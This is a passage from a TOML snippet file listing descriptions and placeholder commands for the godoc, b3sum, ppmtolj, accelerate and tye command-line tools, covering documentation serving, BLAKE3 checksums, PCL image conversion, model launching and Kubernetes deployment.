  description = "Display help for a specific package"
  command = "godoc <fmt>"
  output = ""

[[snippets]]
  description = "Display help for the function "Printf" of "fmt" package"
  command = "godoc <fmt> <Printf>"
  output = ""

[[snippets]]
  description = "Serve documentation as a web server on port 6060"
  command = "godoc -http=:<6060>"
  output = ""

[[snippets]]
  description = "Create an index file"
  command = "godoc -write_index -index_files=<path/to/file>"
  output = ""

[[snippets]]
  description = "Use the given index file to search the docs"
  command = "godoc -http=:<6060> -index -index_files=<path/to/file>"
  output = ""

[[snippets]]
  description = "Calculate the BLAKE3 checksum for one or more files"
  command = "b3sum <path/to/file1 path/to/file2 ...>"
  output = ""

[[snippets]]
  description = "Calculate and save the list of BLAKE3 checksums to a file"
  command = "b3sum <path/to/file1 path/to/file2 ...> > <path/to/file.b3>"
  output = ""

[[snippets]]
  description = "Calculate a BLAKE3 checksum from `stdin`"
  command = "<command> | b3sum"
  output = ""

[[snippets]]
  description = "Read a file of BLAKE3 sums and filenames and verify all files have matching checksums"
  command = "b3sum --check <path/to/file.b3>"
  output = ""

[[snippets]]
  description = "Only show a message for missing files or when verification fails"
  command = "b3sum --check --quiet <path/to/file.b3>"
  output = ""

[[snippets]]
  description = "Convert a PPM file to an HP LaserJet PCL 5 Color file"
  command = "ppmtolj <path/to/input.ppm> > <path/to/output.lj>"
  output = ""

[[snippets]]
  description = "Apply a gamma correction using the specified gamma value"
  command = "ppmtolj -gamma <gamma> <path/to/input.ppm> > <path/to/output.lj>"
  output = ""

[[snippets]]
  description = "Specify the required resolution"
  command = "ppmtolj -resolution <75|100|150|300|600> <path/to/input.ppm> > <path/to/output.lj>"
  output = ""

[[snippets]]
  description = "Print environment information"
  command = "accelerate env"
  output = ""

[[snippets]]
  description = "Interactively create a configuration file"
  command = "accelerate config"
  output = ""

[[snippets]]
  description = "Print the estimated GPU memory cost of running a Hugging Face model with different data types"
  command = "accelerate estimate-memory <name/model>"
  output = ""

[[snippets]]
  description = "Test an Accelerate configuration file"
  command = "accelerate test --config_file <path/to/config.yaml>"
  output = ""

[[snippets]]
  description = "Run a model on CPU with Accelerate"
  command = "accelerate launch <path/to/script.py> <--cpu>"
  output = ""

[[snippets]]
  description = "Run a model on multi-GPU with Accelerate, with 2 machines"
  command = "accelerate launch <path/to/script.py> --multi_gpu --num_machines 2"
  output = ""

[[snippets]]
  description = "Scaffold a `tye.yaml` file representing the application"
  command = "tye init"
  output = ""

[[snippets]]
  description = "Run an application locally"
  command = "tye run"
  output = ""

[[snippets]]
  description = "Build an application's containers"
  command = "tye build"
  output = ""

[[snippets]]
  description = "Push an application's containers"
  command = "tye push"
  output = ""

[[snippets]]
  description = "Deploy an application to Kubernetes"
  command = "tye deploy"
  output = ""

[[snippets]]
  description = "Remove a deployed application from Kubernetes"
  command = "tye undeploy"
  output = ""

